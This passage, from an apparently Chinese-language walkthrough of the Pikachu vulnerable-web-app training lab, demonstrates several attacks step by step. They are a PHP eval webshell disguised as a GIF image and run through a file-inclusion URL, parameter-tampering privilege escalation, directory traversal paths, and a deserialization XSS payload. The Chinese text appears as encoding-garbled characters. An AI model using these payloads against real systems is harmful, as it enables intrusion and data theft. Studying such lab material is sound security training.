+ `<font style="color:rgb(0, 0, 0);"><?=</font>`<font style="color:rgb(0, 0, 0);">æ˜¯</font>`<font style="color:rgb(0, 0, 0);"><?php echo</font>`<font style="color:rgb(0, 0, 0);">çš„çŸ­æ ‡ç­¾ç®€å†™</font>
+ `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">GIF89a</font>`<font style="color:rgb(15, 17, 21);">ï¼ˆåˆæ³•çš„GIFæ–‡ä»¶å¤´ï¼‰</font>
+ <font style="color:rgb(15, 17, 21);">ä½¿ç”¨çŸ­æ ‡ç­¾ç›´æ¥æ‰§è¡Œevalï¼Œç­‰ä»·äº</font>`<font style="color:rgb(15, 17, 21);"><?php echo eval($_POST['a']);?></font>`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051616832.png)

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">å½“ç„¶è¿˜å¯ä»¥å†™æˆè¿™æ ·ï¼š</font>

```bash
GIF89a
<?php @eval($_POST['a']);?>
```

<font style="color:rgb(0, 0, 0);">ä½¿ç”¨å®Œæ•´çš„</font>`<font style="color:rgb(0, 0, 0);"><?php</font>`<font style="color:rgb(0, 0, 0);">æ ‡ç­¾</font>

+ `**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">@</font>**`**<font style="color:rgb(15, 17, 21);"> ç¬¦å·</font>**<font style="color:rgb(15, 17, 21);">ï¼šé”™è¯¯æ§åˆ¶è¿ç®—ç¬¦ï¼ŒæŠ‘åˆ¶å¯èƒ½å‡ºç°çš„é”™è¯¯ä¿¡æ¯</font>
+ **<font style="color:rgb(15, 17, 21);">æ— è¾“å‡º</font>**<font style="color:rgb(15, 17, 21);">ï¼šç›´æ¥æ‰§è¡Œevalä½†ä¸echoç»“æœ</font>
+ **<font style="color:rgb(15, 17, 21);">æ›´éšè”½</font>**<font style="color:rgb(15, 17, 21);">ï¼šä¸äº§ç”Ÿé¢å¤–è¾“å‡ºï¼Œåªæ‰§è¡Œä»£ç </font>

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">æˆåŠŸå°†è¿™ä¸ªå›¾ç‰‡é©¬ä¸Šä¼ </font>

<font style="color:rgb(0, 0, 0);"></font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051623418.png)

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">å›¾ç‰‡åœ°å€ï¼š</font>[http://pikachu:8765/vul/unsafeupload/](http://pikachu:8765/vul/unsafeupload/)<font style="color:rgb(0, 0, 0);">uploads/2026/02/05/171066698428ec3e6d5208475342.jpg</font>

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">å› ä¸ºç›®å‰ä¸ºæ­¢ä¸Šä¼ çš„</font>`<font style="color:rgb(0, 0, 0);">.jpg</font>`<font style="color:rgb(0, 0, 0);">æ–‡ä»¶ï¼ŒæœåŠ¡å™¨åªä¼šæŠŠå®ƒå½“ä½œé™æ€å›¾ç‰‡å¤„ç†ï¼Œå³ä½¿æ–‡ä»¶ä¸­æœ‰ PHP ä»£ç ï¼ŒæœåŠ¡å™¨ä¹Ÿä¸ä¼šå»è°ƒç”¨ PHP è§£é‡Šå™¨æ‰§è¡Œä»£ç ã€‚æ‰€ä»¥æƒ³è¦è¿›è¡Œä¸‹ä¸€æ­¥çš„å›¾ç‰‡é©¬åˆ©ç”¨ï¼Œå°±å¾—å…ˆâ€œè§£æâ€å›¾ç‰‡é©¬ï¼Œä¹Ÿå°±æ˜¯è®©æœåŠ¡å™¨å»æ‰§è¡Œå›¾ç‰‡é©¬ä¸­çš„æ¶æ„ PHP ä»£ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥</font>**<font style="color:rgb(0, 0, 0);">åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è§£æå›¾ç‰‡é©¬ã€‚</font>**





```bash
æ„é€ é“¾æ¥ï¼š
å›¾ç‰‡é©¬çš„ä½ç½®ï¼š
vul/unsafeupload/uploads/2026/02/05/171066698428ec3e6d5208475342.jpg

æ–‡ä»¶åŒ…å«æ¼æ´çš„ä½ç½®ï¼š
/vul/fileinclude/fi_local.php

æ„é€ æ–‡ä»¶åŒ…å«çš„ urlï¼šï¼ˆä¸€å®šè¦è®°ä½åŠ  submitï¼‰
http://pikachu:8765/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2026/02/05/171066698428ec3e6d5208475342.jpg&submit=%E6%8F%90%E4%BA%A4
```

å¯ä»¥çœ‹åˆ°ï¼Œå·²ç»è§£æäº†å›¾ç‰‡é©¬

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051620399.png)

æ­¤æ—¶ï¼Œä½¿ç”¨èšå‰‘è¿æ¥ï¼š`http://pikachu:8765/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2026/02/05/171066698428ec3e6d5208475342.jpg&submit=%E6%8F%90%E4%BA%A4` å°±å¯ä»¥æˆåŠŸäº†

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051623564.png)



# 9ã€over permissionï¼ˆè¶Šæƒæ¼æ´ï¼‰
> <font style="color:rgb(57, 57, 57);">å¦‚æœä½¿ç”¨Aç”¨æˆ·çš„æƒé™å»æ“ä½œBç”¨æˆ·çš„æ•°æ®ï¼ŒAçš„æƒé™å°äºBçš„æƒé™ï¼Œå¦‚æœèƒ½å¤ŸæˆåŠŸæ“ä½œï¼Œåˆ™ç§°ä¹‹ä¸ºè¶Šæƒæ“ä½œã€‚ è¶Šæƒæ¼æ´å½¢æˆçš„åŸå› æ˜¯åå°ä½¿ç”¨äº† ä¸åˆç†çš„æƒé™æ ¡éªŒè§„åˆ™å¯¼è‡´çš„ã€‚</font>
>
> <font style="color:rgb(57, 57, 57);">ä¸€èˆ¬è¶Šæƒæ¼æ´å®¹æ˜“å‡ºç°åœ¨æƒé™é¡µé¢ï¼ˆéœ€è¦ç™»å½•çš„é¡µé¢ï¼‰å¢ã€åˆ ã€æ”¹ã€æŸ¥çš„çš„åœ°æ–¹ï¼Œå½“ç”¨æˆ·å¯¹æƒé™é¡µé¢å†…çš„ä¿¡æ¯è¿›è¡Œè¿™äº›æ“ä½œæ—¶ï¼Œåå°éœ€è¦å¯¹ å¯¹å½“å‰ç”¨æˆ·çš„æƒé™è¿›è¡Œæ ¡éªŒï¼Œçœ‹å…¶æ˜¯å¦å…·å¤‡æ“ä½œçš„æƒé™ï¼Œä»è€Œç»™å‡ºå“åº”ï¼Œè€Œå¦‚æœæ ¡éªŒçš„è§„åˆ™è¿‡äºç®€å•åˆ™å®¹æ˜“å‡ºç°è¶Šæƒæ¼æ´ã€‚</font>
>
> <font style="color:rgb(57, 57, 57);">å› æ­¤ï¼Œåœ¨åœ¨æƒé™ç®¡ç†ä¸­åº”è¯¥éµå®ˆï¼š  
</font><font style="color:rgb(57, 57, 57);">1.ä½¿ç”¨æœ€å°æƒé™åŸåˆ™å¯¹ç”¨æˆ·è¿›è¡Œèµ‹æƒ;  
</font><font style="color:rgb(57, 57, 57);">2.ä½¿ç”¨åˆç†ï¼ˆä¸¥æ ¼ï¼‰çš„æƒé™æ ¡éªŒè§„åˆ™;  
</font><font style="color:rgb(57, 57, 57);">3.ä½¿ç”¨åå°ç™»å½•æ€ä½œä¸ºæ¡ä»¶è¿›è¡Œæƒé™åˆ¤æ–­,åˆ«åŠ¨ä¸åŠ¨å°±çç”¨å‰ç«¯ä¼ è¿›æ¥çš„æ¡ä»¶;  
</font>
>
> <font style="color:rgb(57, 57, 57);">ä½ å¯ä»¥é€šè¿‡â€œOver permissionâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚</font>
>



## 9.1 æ°´å¹³è¶Šæƒ
å…ˆç™»å½•ä¸€ä¸ªè´¦å·ï¼š<font style="color:rgb(77, 92, 115);">lucy/123456</font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051615833.png)

ç‚¹å‡»æŸ¥çœ‹ä¸ªäººä¿¡æ¯ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051623731.png)



è¿™æ—¶æˆ‘ä»¬å‘ç°è¯·æ±‚çš„ url æ˜¯ï¼š

`[http://pikachu:8765/vul/overpermission/op1/op1_mem.php?username=lucy&submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF](http://pikachu:8765/vul/overpermission/op1/op1_mem.php?username=lucy&submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF)`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051630458.png)



æ—¢ç„¶åªæœ‰ä¸€ä¸ªå‚æ•°`username`ï¼Œé‚£æŠŠ`username`æ”¹æˆå…¶ä»–çš„èƒ½ä¸èƒ½è¡Œï¼Ÿ



æ¢æˆ`lili`

`[http://pikachu:8765/vul/overpermission/op1/op1_mem.php?username=lili&submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF](http://pikachu:8765/vul/overpermission/op1/op1_mem.php?username=lili&submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF)`

lili çš„ä¸ªäººä¿¡æ¯ç›´æ¥æš´éœ²äº†

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051635618.png)





## 9.2 å‚ç›´è¶Šæƒ
æç¤ºä¸­æœ‰ä¸€ä¸ªè¶…çº§ç”¨æˆ·`admin/123456`ï¼Œä¸€ä¸ªæ™®é€šç”¨æˆ·`pikachu/000000`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051617510.png)



admin ç”¨æˆ·ï¼šop2_admin.php



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051628753.png)

æ·»åŠ ç”¨æˆ·åŠŸèƒ½ï¼šop2_admin_edit.php

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051636846.png)



ç™»å½• pikachu ç”¨æˆ·ï¼šop2_user.php

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051615664.png)





åœ¨å½“å‰ä¸ºæ™®é€šç”¨æˆ·çš„èº«ä»½ä¸‹ï¼Œå°è¯•æ‰“å¼€**æ·»åŠ ç”¨æˆ·åŠŸèƒ½ï¼šop2_admin_edit.php**

å‘ç°å½“å‰ç”¨æˆ·ä¾æ—§æ˜¯æ™®é€šç”¨æˆ·ï¼Œä½†æ˜¯å¤šå‡ºäº†æœ¬ä¸è¯¥æœ‰çš„æ·»åŠ ç”¨æˆ·åŠŸèƒ½ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051621697.png)

åˆ›å»ºç”¨æˆ·

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051628853.png)



å†æ¬¡ç™»å½•åˆ°è¶…çº§ç”¨æˆ·ï¼Œå‘ç°æ™®é€šç”¨æˆ·æˆåŠŸè¶Šæƒåˆ›å»ºäº†å¦ä¸€ä¸ªç”¨æˆ·

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051627689.png)





# 10ã€ç›®å½•éå†
> **<font style="color:rgb(57, 57, 57);">ç›®å½•éå†æ¼æ´æ¦‚è¿°</font>**
>
> <font style="color:rgb(57, 57, 57);">åœ¨webåŠŸèƒ½è®¾è®¡ä¸­,å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä¼šè¦å°†éœ€è¦è®¿é—®çš„æ–‡ä»¶å®šä¹‰æˆå˜é‡ï¼Œä»è€Œè®©å‰ç«¯çš„åŠŸèƒ½ä¾¿çš„æ›´åŠ çµæ´»ã€‚ å½“ç”¨æˆ·å‘èµ·ä¸€ä¸ªå‰ç«¯çš„è¯·æ±‚æ—¶ï¼Œä¾¿ä¼šå°†è¯·æ±‚çš„è¿™ä¸ªæ–‡ä»¶çš„å€¼(æ¯”å¦‚æ–‡ä»¶åç§°)ä¼ é€’åˆ°åå°ï¼Œåå°å†æ‰§è¡Œå…¶å¯¹åº”çš„æ–‡ä»¶ã€‚ åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¦‚æœåå°æ²¡æœ‰å¯¹å‰ç«¯ä¼ è¿›æ¥çš„å€¼è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡â€œ../â€è¿™æ ·çš„æ‰‹æ®µè®©åå°æ‰“å¼€æˆ–è€…æ‰§è¡Œä¸€äº›å…¶ä»–çš„æ–‡ä»¶ã€‚ ä»è€Œå¯¼è‡´åå°æœåŠ¡å™¨ä¸Šå…¶ä»–ç›®å½•çš„æ–‡ä»¶ç»“æœè¢«éå†å‡ºæ¥ï¼Œå½¢æˆç›®å½•éå†æ¼æ´ã€‚  
</font>
>
> <font style="color:rgb(57, 57, 57);">çœ‹åˆ°è¿™é‡Œ,ä½ å¯èƒ½ä¼šè§‰å¾—ç›®å½•éå†æ¼æ´å’Œä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½ï¼Œç”šè‡³æ–‡ä»¶åŒ…å«æ¼æ´æœ‰å·®ä¸å¤šçš„æ„æ€ï¼Œæ˜¯çš„ï¼Œç›®å½•éå†æ¼æ´å½¢æˆçš„æœ€ä¸»è¦çš„åŸå› è·Ÿè¿™ä¸¤è€…ä¸€æ ·ï¼Œéƒ½æ˜¯åœ¨åŠŸèƒ½è®¾è®¡ä¸­å°†è¦æ“ä½œçš„æ–‡ä»¶ä½¿ç”¨å˜é‡çš„ æ–¹å¼ä¼ é€’ç»™äº†åå°ï¼Œè€Œåˆæ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘è€Œé€ æˆçš„ï¼Œåªæ˜¯å‡ºç°çš„ä½ç½®æ‰€å±•ç°çš„ç°è±¡ä¸ä¸€æ ·ï¼Œå› æ­¤ï¼Œè¿™é‡Œè¿˜æ˜¯å•ç‹¬æ‹¿å‡ºæ¥å®šä¹‰ä¸€ä¸‹ã€‚</font>
>
> <font style="color:rgb(57, 57, 57);">éœ€è¦åŒºåˆ†ä¸€ä¸‹çš„æ˜¯,å¦‚æœä½ é€šè¿‡ä¸å¸¦å‚æ•°çš„urlï¼ˆæ¯”å¦‚ï¼šhttp://xxxx/docï¼‰åˆ—å‡ºäº†docæ–‡ä»¶å¤¹é‡Œé¢æ‰€æœ‰çš„æ–‡ä»¶ï¼Œè¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬æˆä¸ºæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚ è€Œå¹¶ä¸å½’ä¸ºç›®å½•éå†æ¼æ´ã€‚ï¼ˆå…³äºæ•æ„Ÿä¿¡æ¯æ³„éœ²ä½ ä½ å¯ä»¥åœ¨"i can see you ABC"ä¸­äº†è§£æ›´å¤šï¼‰</font>
>
> <font style="color:rgb(57, 57, 57);">ä½ å¯ä»¥é€šè¿‡â€œ../../â€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚</font>
>



ä¿©ä¸ªæ–‡ä»¶çš„è®¿é—®æ–¹å¼éƒ½æ˜¯ï¼šåœ¨ title åæ·»åŠ æ–‡ä»¶åè¿›è¡Œè®¿é—®

`[http://pikachu:8765/vul/dir/dir_list.php?title=jarheads.php](http://pikachu:8765/vul/dir/dir_list.php?title=jarheads.php)`

`[http://pikachu:8765/vul/dir/dir_list.php?title=truman.php](http://pikachu:8765/vul/dir/dir_list.php?title=truman.php)`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051634544.png)





åˆ©ç”¨æ–¹å¼å°±æ˜¯ï¼šå¯ä»¥æ‰“å¼€ä»»æ„ä¸€ä¸ªæ–‡ä»¶

`[http://pikachu:8765/vul/dir/dir_list.php?title=../../../index.php](http://pikachu:8765/vul/dir/dir_list.php?title=../../../index.php)`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051629840.png)



# 11ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²
> **<font style="color:rgb(57, 57, 57);">æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¦‚è¿°</font>**
>
> <font style="color:rgb(57, 57, 57);">ç”±äºåå°äººå‘˜çš„ç–å¿½æˆ–è€…ä¸å½“çš„è®¾è®¡ï¼Œå¯¼è‡´ä¸åº”è¯¥è¢«å‰ç«¯ç”¨æˆ·çœ‹åˆ°çš„æ•°æ®è¢«è½»æ˜“çš„è®¿é—®åˆ°ã€‚ æ¯”å¦‚ï¼š  
</font><font style="color:rgb(57, 57, 57);">---é€šè¿‡è®¿é—®urlä¸‹çš„ç›®å½•ï¼Œå¯ä»¥ç›´æ¥åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨;  
</font><font style="color:rgb(57, 57, 57);">---è¾“å…¥é”™è¯¯çš„urlå‚æ•°åæŠ¥é”™ä¿¡æ¯é‡Œé¢åŒ…å«æ“ä½œç³»ç»Ÿã€ä¸­é—´ä»¶ã€å¼€å‘è¯­è¨€çš„ç‰ˆæœ¬æˆ–å…¶ä»–ä¿¡æ¯;  
</font><font style="color:rgb(57, 57, 57);">---å‰ç«¯çš„æºç ï¼ˆhtml,css,jsï¼‰é‡Œé¢åŒ…å«äº†æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚åå°ç™»å½•åœ°å€ã€å†…ç½‘æ¥å£ä¿¡æ¯ã€ç”šè‡³è´¦å·å¯†ç ç­‰;  
</font>
>
> <font style="color:rgb(57, 57, 57);">ç±»ä¼¼ä»¥ä¸Šè¿™äº›æƒ…å†µï¼Œæˆ‘ä»¬æˆä¸ºæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚æ•æ„Ÿä¿¡æ¯æ³„éœ²è™½ç„¶ä¸€ç›´è¢«è¯„ä¸ºå±å®³æ¯”è¾ƒä½çš„æ¼æ´ï¼Œä½†è¿™äº›æ•æ„Ÿä¿¡æ¯å¾€å¾€ç»™æ”»å‡»ç€å®æ–½è¿›ä¸€æ­¥çš„æ”»å‡»æä¾›å¾ˆå¤§çš„å¸®åŠ©,ç”šè‡³â€œç¦»è°±â€çš„æ•æ„Ÿä¿¡æ¯æ³„éœ²ä¹Ÿä¼šç›´æ¥é€ æˆä¸¥é‡çš„æŸå¤±ã€‚ å› æ­¤,åœ¨webåº”ç”¨çš„å¼€å‘ä¸Šï¼Œé™¤äº†è¦è¿›è¡Œå®‰å…¨çš„ä»£ç ç¼–å†™ï¼Œä¹Ÿéœ€è¦æ³¨æ„å¯¹æ•æ„Ÿä¿¡æ¯çš„åˆç†å¤„ç†ã€‚</font>
>
> <font style="color:rgb(57, 57, 57);">ä½ å¯ä»¥é€šè¿‡â€œi can see your abcâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚</font>
>





é¦–å…ˆæ‰¾æºç ï¼š

æ‰¾åˆ°ä¸€ä¸ªæµ‹è¯•è´¦å·

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051621445.png)



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051627272.png)





å¦ä¸€ç§ï¼šé¢˜ç›®è¯´æ‰¾åˆ° abc

é‚£ä¹ˆè®¿é—® abc.php è¯•è¯•

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051625977.png)



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051618304.png)



# 12ã€PHP ååºåˆ—åŒ–
## æ¦‚è¿°
åœ¨ç†è§£è¿™ä¸ªæ¼æ´å‰,ä½ éœ€è¦å…ˆææ¸…æ¥šphpä¸­serialize()ï¼Œunserialize()è¿™ä¸¤ä¸ªå‡½æ•°ã€‚

**åºåˆ—åŒ–serialize()**

åºåˆ—åŒ–è¯´é€šä¿—ç‚¹å°±æ˜¯æŠŠä¸€ä¸ªå¯¹è±¡å˜æˆå¯ä»¥ä¼ è¾“çš„å­—ç¬¦ä¸²,æ¯”å¦‚ä¸‹é¢æ˜¯ä¸€ä¸ªå¯¹è±¡:

```plain
class S{
        public $test="pikachu";
    }
    $s=new S(); //åˆ›å»ºä¸€ä¸ªå¯¹è±¡
    serialize($s); //æŠŠè¿™ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–

  
    åºåˆ—åŒ–åå¾—åˆ°çš„ç»“æœæ˜¯è¿™ä¸ªæ ·å­çš„:O:1:"S":1:{s:4:"test";s:7:"pikachu";}
        O:ä»£è¡¨object
        1:ä»£è¡¨å¯¹è±¡åå­—é•¿åº¦ä¸ºä¸€ä¸ªå­—ç¬¦
        S:å¯¹è±¡çš„åç§°
        1:ä»£è¡¨å¯¹è±¡é‡Œé¢æœ‰ä¸€ä¸ªå˜é‡
        s:æ•°æ®ç±»å‹
        4:å˜é‡åç§°çš„é•¿åº¦
        test:å˜é‡åç§°
        s:æ•°æ®ç±»å‹
        7:å˜é‡å€¼çš„é•¿åº¦
        pikachu:å˜é‡å€¼
```

**ååºåˆ—åŒ–unserialize()**

å°±æ˜¯æŠŠè¢«åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸä¸ºå¯¹è±¡,ç„¶ååœ¨æ¥ä¸‹æ¥çš„ä»£ç ä¸­ç»§ç»­ä½¿ç”¨ã€‚

```plain
$u=unserialize("O:1:"S":1:{s:4:"test";s:7:"pikachu";}");
    echo $u->test; //å¾—åˆ°çš„ç»“æœä¸ºpikachu
```



åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœ¬èº«æ²¡æœ‰é—®é¢˜,ä½†æ˜¯å¦‚æœååºåˆ—åŒ–çš„å†…å®¹æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„,ä¸”åå°ä¸æ­£å½“çš„ä½¿ç”¨äº†PHPä¸­çš„é­”æ³•å‡½æ•°,å°±ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜

```plain
å¸¸è§çš„å‡ ä¸ªé­”æ³•å‡½æ•°:
        __construct()å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨

        __destruct()å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨

        __toString()å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨

        __sleep() åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ

        __wakeupå°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨

        æ¼æ´ä¸¾ä¾‹:

        class S{
            var $test = "pikachu";
            function __destruct(){
                echo $this->test;
            }
        }
        $s = $_GET['test'];
        @$unser = unserialize($a);

        payload:O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
```





ä¸€èˆ¬ PHP ååºåˆ—åŒ–éƒ½ä¼šç»™å‡ºæºç ï¼Œåªè¦æŒ‰ç…§æºç æ„é€ å‡ºååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¼ å…¥å³å¯



æ‰“å¼€æºç ï¼šWWW\pikachu-master\vul\unserilization\unser.php

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051627966.png)



```php
class S{
  var $test = "pikachu";
  function __construct(){
    echo $this->test;
  }
}


//O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
$html='';
if(isset($_POST['o'])){
  $s = $_POST['o'];
  if(!@$unser = unserialize($s)){
    $html.="<p>å¤§å…„å¼Ÿ,æ¥ç‚¹åŠ²çˆ†ç‚¹å„¿çš„!</p>";
  }else{
    $html.="<p>{$unser->test}</p>";
  }

}
```

POST ä¼ å…¥å‚æ•° o ï¼Œåå°å°†æ­¤å˜é‡ååºåˆ—åŒ–æˆ php å¯¹è±¡ï¼Œç„¶åè¾“å‡ºè¯¥å¯¹è±¡çš„ test å±æ€§



æ„é€ åºåˆ—åŒ–å‡½æ•°ï¼š

```php
<?php
class S{
    var $test = "<script>alert('xss')</script>";
}

$a = new S();
$payload = serialize($a);
echo $payload;

?>
```



`O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051622786.png)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051623114.png)



# 13ã€XXE
> <font style="color:rgb(57, 57, 57);">XXE -"xml external entity injection"</font>  
<font style="color:rgb(57, 57, 57);">æ—¢"xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´"ã€‚</font>  
<font style="color:rgb(57, 57, 57);">æ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯"æ”»å‡»è€…é€šè¿‡å‘æœåŠ¡å™¨æ³¨å…¥æŒ‡å®šçš„xmlå®ä½“å†…å®¹,ä»è€Œè®©æœåŠ¡å™¨æŒ‰ç…§æŒ‡å®šçš„é…ç½®è¿›è¡Œæ‰§è¡Œ,å¯¼è‡´é—®é¢˜"</font>  
<font style="color:rgb(57, 57, 57);">ä¹Ÿå°±æ˜¯è¯´æœåŠ¡ç«¯æ¥æ”¶å’Œè§£æäº†æ¥è‡ªç”¨æˆ·ç«¯çš„xmlæ•°æ®,è€Œåˆæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶,ä»è€Œå¯¼è‡´xmlå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚</font>  

<font style="color:rgb(57, 57, 57);">å…·ä½“çš„å…³äºxmlå®ä½“çš„ä»‹ç»,ç½‘ç»œä¸Šæœ‰å¾ˆå¤š,è‡ªå·±åŠ¨æ‰‹å…ˆæŸ¥ä¸€ä¸‹ã€‚</font>  
